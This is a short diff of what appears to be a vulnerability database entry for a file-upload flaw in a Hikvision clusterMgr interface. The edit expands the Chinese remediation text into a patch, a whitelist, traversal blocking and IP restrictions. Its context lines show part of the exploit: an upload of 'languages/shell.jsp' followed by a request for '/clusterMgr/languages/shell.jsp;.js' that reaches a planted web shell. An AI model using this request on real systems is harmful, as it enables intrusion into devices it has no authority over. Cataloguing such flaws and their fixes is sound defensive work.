@@ -11,7 +11,7 @@ Content-Disposition: form-data; name="file"; filename="languages/shell.jsp"
 ------Boundary--
 
 GET /clusterMgr/languages/shell.jsp;.js HTTP/1.1 Host: target:1443"""
-fix = "联系厂商获取补丁"
+fix = "联系海康威视厂商获取 TVD-2026-XXXXX 安全补丁；对 /clusterMgr/clusters/ssl/file 接口添加文件类型白名单校验；限制文件上传路径不可包含 ../ 遍历序列；JSP 目录禁止写入文件；限制该接口仅允许内网管理 IP 访问。"
 date = 20251017
 label = "nday"
 cve = "TVD-2026-XXXXX"
